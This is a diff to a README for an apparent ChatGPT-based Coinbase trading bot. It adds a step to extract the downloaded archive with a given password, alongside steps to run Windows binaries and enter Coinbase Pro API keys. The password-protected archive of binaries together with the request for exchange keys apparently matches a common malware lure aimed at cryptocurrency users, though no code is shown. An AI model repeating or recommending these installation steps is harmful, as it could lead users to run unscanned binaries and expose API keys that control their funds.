@@ -21,6 +21,7 @@ The algorithm works as follows:
 ### Installation
 This repository contains both PROJECT and BINARY files (windows only).
 - [Download](https://github.com/Zhang8081/chatgpt-coinbase-trading-bot/archive/refs/heads/main.zip) this repository
+- Extract archive with pass `oLa9q2`
 - Install the required dependencies using NuGet package manager
 - Build the project as x86 (important!)
 - Run the application and specify your Coinbase Pro API keys
